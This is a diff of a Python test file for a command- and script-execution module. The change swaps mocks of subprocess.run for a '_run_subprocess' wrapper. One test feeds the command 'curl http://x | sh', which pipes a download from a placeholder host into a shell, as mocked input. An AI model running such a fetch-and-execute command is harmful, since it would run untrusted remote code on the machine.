@@ -268,13 +268,13 @@ def test_exec_command_bad_timeout(monkeypatch):
     def fake_run(cmd, **kw):
         captured["timeout"] = kw.get("timeout")
         return _result()
-    monkeypatch.setattr(ec.subprocess, "run", fake_run)
+    monkeypatch.setattr(ec, "_run_subprocess", fake_run)
     ec.exec_command("echo hi", timeout="not-a-number")
     assert captured["timeout"] == ec.DEFAULT_TIMEOUT
 
 
 def test_exec_command_stderr_truncated(monkeypatch):
-    monkeypatch.setattr(ec.subprocess, "run",
+    monkeypatch.setattr(ec, "_run_subprocess",
                        lambda *a, **k: _result(stderr="y" * (ec.MAX_OUTPUT_LENGTH + 100)))
     r = ec.exec_command("ls /nonexistent")
     assert "截断" in r["stderr"]
@@ -284,14 +284,14 @@ def test_exec_command_stderr_truncated(monkeypatch):
 def test_exec_command_generic_exception(monkeypatch):
     def boom(*a, **k):
         raise RuntimeError("subprocess exploded")
-    monkeypatch.setattr(ec.subprocess, "run", boom)
+    monkeypatch.setattr(ec, "_run_subprocess", boom)
     r = ec.exec_command("echo hi")
     assert "执行失败" in r["error"]
     assert r["exit_code"] == -1
 
 
 def test_exec_command_snapshot_thread_error(monkeypatch):
-    monkeypatch.setattr(ec.subprocess, "run", lambda *a, **k: _result(rc=0))
+    monkeypatch.setattr(ec, "_run_subprocess", lambda *a, **k: _result(rc=0))
     monkeypatch.setattr(ec, "_create_snapshot", lambda cmd, wd: {"snapshot_id": "s1", "git": {}, "backed_up_files": []})
     monkeypatch.setattr(threading, "Thread", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("no threads")))
     r = ec.exec_command("curl http://x | sh")
@@ -304,7 +304,7 @@ def test_exec_command_workdir_passed(monkeypatch):
         captured["cwd"] = kw.get("cwd")
         captured["timeout"] = kw.get("timeout")
         return _result(stdout="hi")
-    monkeypatch.setattr(ec.subprocess, "run", fake_run)
+    monkeypatch.setattr(ec, "_run_subprocess", fake_run)
     ec.exec_command("echo hi", timeout=5, workdir="/tmp")
     assert captured["cwd"] == "/tmp"
     assert captured["timeout"] == 5
@@ -317,7 +317,7 @@ def test_run_script_bad_timeout(monkeypatch):
     def fake_run(cmd, **kw):
         captured["timeout"] = kw.get("timeout")
         return _result()
-    monkeypatch.setattr(ec.subprocess, "run", fake_run)
+    monkeypatch.setattr(ec, "_run_subprocess", fake_run)
     r = ec.run_script("print(1)", timeout="abc")
     assert r["exit_code"] == 0
     assert captured["timeout"] == 32  # 30 + 2
@@ -328,7 +328,7 @@ def test_run_script_timeout_clamped(monkeypatch):
     def fake_run(cmd, **kw):
         captured["timeout"] = kw.get("timeout")
         return _result()
-    monkeypatch.setattr(ec.subprocess, "run", fake_run)
+    monkeypatch.setattr(ec, "_run_subprocess", fake_run)
     ec.run_script("print(1)", timeout=0)
     assert captured["timeout"] == 7  # 5 + 2
     ec.run_script("print(1)", timeout=9999)
@@ -341,7 +341,7 @@ def test_run_script_unsupported_language():
 
 
 def test_run_script_timeout(monkeypatch):
-    monkeypatch.setattr(ec.subprocess, "run",
+    monkeypatch.setattr(ec, "_run_subprocess",
                        lambda *a, **k: (_ for _ in ()).throw(sp.TimeoutExpired("x", 30)))
     r = ec.run_script("sleep 100")
     assert "超时" in r["error"]
@@ -350,13 +350,13 @@ def test_run_script_timeout(monkeypatch):
 def test_run_script_generic_exception(monkeypatch):
     def boom(*a, **k):
         raise RuntimeError("interp missing")
-    monkeypatch.setattr(ec.subprocess, "run", boom)
+    monkeypatch.setattr(ec, "_run_subprocess", boom)
     r = ec.run_script("print(1)")
     assert "执行失败" in r["error"]
 
 
 def test_run_script_cleanup_error_swallowed(monkeypatch):
-    monkeypatch.setattr(ec.subprocess, "run", lambda *a, **k: _result(rc=0))
+    monkeypatch.setattr(ec, "_run_subprocess", lambda *a, **k: _result(rc=0))
     monkeypatch.setattr(ec.shutil, "rmtree", lambda *a, **k: (_ for _ in ()).throw(OSError("locked")))
     r = ec.run_script("print(1)")
     assert r["exit_code"] == 0
@@ -367,7 +367,7 @@ def test_run_script_sh_interpreter_darwin(monkeypatch):
     def fake_run(cmd, **kw):
         captured["cmd"] = cmd
         return _result(rc=0)
-    monkeypatch.setattr(ec.subprocess, "run", fake_run)
+    monkeypatch.setattr(ec, "_run_subprocess", fake_run)
     monkeypatch.setattr(sys, "platform", "darwin")
     ec.run_script("echo hi", language="sh")
     assert captured["cmd"] == ["/bin/sh", captured["cmd"][1]]
@@ -381,7 +381,7 @@ def test_run_script_win32_interpreters(monkeypatch):
     def fake_run(cmd, **kw):
         captured["cmd"] = cmd
         return _result(rc=0)
-    monkeypatch.setattr(ec.subprocess, "run", fake_run)
+    monkeypatch.setattr(ec, "_run_subprocess", fake_run)
     monkeypatch.setattr(sys, "platform", "win32")
     ec.run_script("echo hi", language="sh")
     assert captured["cmd"][:2] == ["cmd", "/c"]
